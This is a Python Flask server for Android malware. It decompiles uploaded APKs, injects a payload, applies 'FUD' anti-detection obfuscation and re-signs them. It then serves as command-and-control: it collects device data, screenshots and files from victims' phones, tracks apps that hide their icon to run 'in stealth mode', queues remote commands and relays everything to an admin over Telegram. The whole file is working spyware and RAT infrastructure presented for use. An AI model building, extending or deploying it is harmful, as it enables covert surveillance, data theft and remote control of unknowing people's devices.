import os
import time
import uuid
import json
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename
from dotenv import load_dotenv
import requests

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-secret-key-change-in-production')
app.config['MAX_CONTENT_LENGTH'] = int(os.getenv('MAX_FILE_SIZE_MB', 100)) * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['OUTPUT_FOLDER'] = 'output'
app.config['TEMP_FOLDER'] = 'temp'

CORS(app)

# Ensure directories exist
for folder in [app.config['UPLOAD_FOLDER'], app.config['OUTPUT_FOLDER'], app.config['TEMP_FOLDER']]:
    os.makedirs(folder, exist_ok=True)

# Store processing jobs
processing_jobs = {}

# Import APK modifier utilities
from utils.apk_modifier import APKModifier
from utils.telegram_bot import TelegramBot

# Initialize Telegram Bot
telegram_bot = None
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_ADMIN_CHAT_ID = os.getenv('TELEGRAM_ADMIN_CHAT_ID', '')

if TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID:
    telegram_bot = TelegramBot(TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_CHAT_ID)
    telegram_bot.start()
    print(f"✅ Telegram Bot initialized and running")

@app.route('/')
def index():
    """Render the main page"""
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_apk():
    """Handle APK file upload"""
    try:
        if 'apk_file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['apk_file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        if not file.filename.endswith('.apk'):
            return jsonify({'error': 'File must be an APK'}), 400
        
        # Generate unique job ID
        job_id = str(uuid.uuid4())
        
        # Save uploaded file
        filename = secure_filename(file.filename)
        original_name = os.path.splitext(filename)[0]
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], f'{job_id}_{filename}')
        file.save(filepath)
        
        # Get options from request
        options = {
            'mode': request.form.get('mode', 'fud'),
            'lib_name': request.form.get('lib_name', 'libxx.so'),
            'custom_options': request.form.get('custom_options', ''),
            'upload_server': request.form.get('upload_server', os.getenv('UPLOAD_SERVER_URL', '')),
        }
        
        # Initialize job status
        processing_jobs[job_id] = {
            'status': 'queued',
            'progress': 0,
            'message': 'Upload successful, queued for processing',
            'filename': filename,
            'original_name': original_name,
            'started_at': datetime.now().isoformat(),
            'options': options
        }
        
        # Start background processing
        thread = threading.Thread(target=process_apk_background, args=(job_id, filepath, options))
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'job_id': job_id,
            'message': 'APK uploaded successfully and processing started'
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/status/<job_id>')
def get_status(job_id):
    """Get processing status"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    return jsonify(processing_jobs[job_id])

@app.route('/download/<job_id>')
def download_apk(job_id):
    """Download processed APK"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = processing_jobs[job_id]
    if job['status'] != 'completed':
        return jsonify({'error': 'APK not ready yet'}), 400
    
    output_file = job.get('output_file')
    if not output_file or not os.path.exists(output_file):
        return jsonify({'error': 'Output file not found'}), 404
    
    return send_file(output_file, as_attachment=True, download_name=job.get('output_filename', 'modified.apk'))

def process_apk_background(job_id, filepath, options):
    """Background task to process APK"""
    try:
        # Update status
        processing_jobs[job_id]['status'] = 'processing'
        processing_jobs[job_id]['progress'] = 10
        processing_jobs[job_id]['message'] = 'Initializing APK modifier...'
        
        # Initialize modifier
        modifier = APKModifier(filepath, options)
        
        # Step 1: Decompile APK
        processing_jobs[job_id]['progress'] = 20
        processing_jobs[job_id]['message'] = 'Decompiling APK...'
        modifier.decompile()
        
        # Step 2: Inject payload
        processing_jobs[job_id]['progress'] = 40
        processing_jobs[job_id]['message'] = 'Injecting payload...'
        modifier.inject_payload()
        
        # Step 3: Apply obfuscation (FUD mode)
        if options['mode'] == 'fud':
            processing_jobs[job_id]['progress'] = 60
            processing_jobs[job_id]['message'] = 'Applying FUD obfuscation...'
            modifier.apply_obfuscation()
        
        # Step 4: Sign APK with custom lib
        processing_jobs[job_id]['progress'] = 75
        processing_jobs[job_id]['message'] = f'Signing APK with {options["lib_name"]}...'
        modifier.sign_apk(options['lib_name'])
        
        # Step 5: Recompile
        processing_jobs[job_id]['progress'] = 85
        processing_jobs[job_id]['message'] = 'Recompiling APK...'
        output_file = modifier.recompile()
        
        # Step 6: Upload to server
        if options.get('upload_server'):
            processing_jobs[job_id]['progress'] = 95
            processing_jobs[job_id]['message'] = 'Uploading to server...'
            upload_url = upload_to_server(output_file, options['upload_server'])
            processing_jobs[job_id]['upload_url'] = upload_url
        
        # Complete
        processing_jobs[job_id]['status'] = 'completed'
        processing_jobs[job_id]['progress'] = 100
        processing_jobs[job_id]['message'] = 'APK processed successfully!'
        processing_jobs[job_id]['output_file'] = output_file
        processing_jobs[job_id]['output_filename'] = f"modified_{processing_jobs[job_id]['original_name']}.apk"
        processing_jobs[job_id]['completed_at'] = datetime.now().isoformat()
        
    except Exception as e:
        processing_jobs[job_id]['status'] = 'failed'
        processing_jobs[job_id]['message'] = f'Error: {str(e)}'
        processing_jobs[job_id]['progress'] = 0

@app.route('/api/device_data', methods=['POST'])
def receive_device_data():
    """Receive device data from the app"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        # Store device data
        device_id = data.get('device_id', 'unknown')
        timestamp = data.get('timestamp', datetime.now().isoformat())
        data_type = data.get('type', 'general')
        
        # Save to file or database
        data_dir = os.path.join(app.config['OUTPUT_FOLDER'], 'device_data')
        os.makedirs(data_dir, exist_ok=True)
        
        filename = f"{device_id}_{int(time.time())}.json"
        filepath = os.path.join(data_dir, filename)
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"📱 Device data received from {device_id}")
        
        # Notify via Telegram
        if telegram_bot:
            telegram_bot.notify_data_received(device_id, data_type, data.get('data'))
        
        return jsonify({
            'success': True,
            'message': 'Data received successfully',
            'timestamp': timestamp
        })
    
    except Exception as e:
        print(f"Error receiving device data: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    """Receive screenshot from the app"""
    try:
        if 'screenshot' not in request.files:
            return jsonify({'error': 'No screenshot provided'}), 400
        
        file = request.files['screenshot']
        device_id = request.form.get('device_id', 'unknown')
        
        # Save screenshot
        screenshots_dir = os.path.join(app.config['OUTPUT_FOLDER'], 'screenshots', device_id)
        os.makedirs(screenshots_dir, exist_ok=True)
        
        filename = f"screenshot_{int(time.time())}.png"
        filepath = os.path.join(screenshots_dir, filename)
        file.save(filepath)
        
        print(f"📸 Screenshot received from {device_id}")
        
        # Notify via Telegram
        if telegram_bot:
            telegram_bot.notify_screenshot(device_id, filepath)
        
        return jsonify({
            'success': True,
            'message': 'Screenshot received successfully',
            'filename': filename
        })
    
    except Exception as e:
        print(f"Error receiving screenshot: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/icon_hidden', methods=['POST'])
def icon_hidden_notification():
    """Receive notification that app icon was hidden"""
    try:
        data = request.get_json()
        device_id = data.get('device_id', 'unknown')
        
        print(f"🔒 App icon hidden on device: {device_id}")
        
        # Notify via Telegram
        if telegram_bot:
            message = f"🔒 **Icon Hidden**\n\nDevice: {device_id}\nApp icon was automatically hidden after 1 day.\n\nThe app is now running in stealth mode."
            telegram_bot.send_message(telegram_bot.admin_chat_id, message)
        
        return jsonify({'success': True})
    
    except Exception as e:
        print(f"Error processing icon hidden notification: {e}")
        return jsonify({'error': str(e)}), 500

# Bot command queue storage
bot_commands = {}
bot_results = {}

@app.route('/api/bot/send_command', methods=['POST'])
def send_bot_command():
    """Send command to a device via bot"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        command_type = data.get('type')
        params = data.get('params', {})
        
        if not device_id or not command_type:
            return jsonify({'error': 'Missing device_id or command type'}), 400
        
        command_id = str(uuid.uuid4())
        
        if device_id not in bot_commands:
            bot_commands[device_id] = []
        
        bot_commands[device_id].append({
            'command_id': command_id,
            'type': command_type,
            'params': params,
            'timestamp': datetime.now().isoformat()
        })
        
        print(f"🤖 Command queued for {device_id}: {command_type}")
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': 'Command queued successfully'
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bot/get_commands', methods=['POST'])
def get_bot_commands():
    """Device polls for pending commands"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400
        
        commands = bot_commands.get(device_id, [])
        
        # Clear commands after sending
        if device_id in bot_commands:
            bot_commands[device_id] = []
        
        return jsonify({
            'success': True,
            'commands': commands
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bot/command_result', methods=['POST'])
def receive_command_result():
    """Receive command execution result from device"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        command_id = data.get('command_id')
        result = data.get('result')
        status = data.get('status')
        
        if not device_id or not command_id:
            return jsonify({'error': 'Missing required fields'}), 400
        
        if device_id not in bot_results:
            bot_results[device_id] = {}
        
        bot_results[device_id][command_id] = {
            'result': result,
            'status': status,
            'timestamp': data.get('timestamp', datetime.now().isoformat())
        }
        
        print(f"✅ Command result received from {device_id}: {command_id}")
        
        # Notify via Telegram
        if telegram_bot:
            # Get command type from stored commands if available
            command_type = "Unknown"
            if device_id in bot_commands:
                for cmd in bot_commands[device_id]:
                    if cmd.get('command_id') == command_id:
                        command_type = cmd.get('type', 'Unknown')
                        break
            
            telegram_bot.notify_command_result(device_id, command_type, result, status)
        
        return jsonify({
            'success': True,
            'message': 'Result received'
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bot/get_result/<device_id>/<command_id>', methods=['GET'])
def get_command_result(device_id, command_id):
    """Get result of a specific command"""
    try:
        if device_id not in bot_results:
            return jsonify({'error': 'Device not found'}), 404
        
        if command_id not in bot_results[device_id]:
            return jsonify({'error': 'Command result not found'}), 404
        
        return jsonify({
            'success': True,
            'result': bot_results[device_id][command_id]
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bot/upload_file', methods=['POST'])
def receive_bot_file():
    """Receive file uploaded from device via bot"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        device_id = request.form.get('device_id', 'unknown')
        
        # Save file
        files_dir = os.path.join(app.config['OUTPUT_FOLDER'], 'bot_files', device_id)
        os.makedirs(files_dir, exist_ok=True)
        
        filename = secure_filename(file.filename)
        filepath = os.path.join(files_dir, filename)
        file.save(filepath)
        
        print(f"📁 File received from {device_id}: {filename}")
        
        # Notify via Telegram
        if telegram_bot:
            telegram_bot.notify_file_received(device_id, filepath)
        
        return jsonify({
            'success': True,
            'message': 'File received successfully',
            'filename': filename
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bot/devices', methods=['GET'])
def list_bot_devices():
    """List all connected devices"""
    try:
        devices = []
        data_dir = os.path.join(app.config['OUTPUT_FOLDER'], 'device_data')
        
        if os.path.exists(data_dir):
            for filename in os.listdir(data_dir):
                if filename.endswith('.json'):
                    device_id = filename.split('_')[0]
                    if device_id not in [d['device_id'] for d in devices]:
                        devices.append({
                            'device_id': device_id,
                            'last_seen': datetime.fromtimestamp(
                                os.path.getmtime(os.path.join(data_dir, filename))
                            ).isoformat()
                        })
        
        return jsonify({
            'success': True,
            'devices': devices
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def upload_to_server(filepath, upload_url):
    """Upload file to remote server"""
    try:
        with open(filepath, 'rb') as f:
            files = {'file': f}
            headers = {}
            api_key = os.getenv('UPLOAD_API_KEY')
            if api_key:
                headers['Authorization'] = f'Bearer {api_key}'
            
            response = requests.post(upload_url, files=files, headers=headers, timeout=300)
            response.raise_for_status()
            
            result = response.json()
            return result.get('url', upload_url)
    except Exception as e:
        print(f"Upload error: {e}")
        return None

if __name__ == '__main__':
    host = os.getenv('HOST', '0.0.0.0')
    port = int(os.getenv('PORT', 5000))
    debug = os.getenv('FLASK_ENV') == 'development'
    
    print(f"🚀 APK Modifier Server starting on {host}:{port}")
    app.run(host=host, port=port, debug=debug)
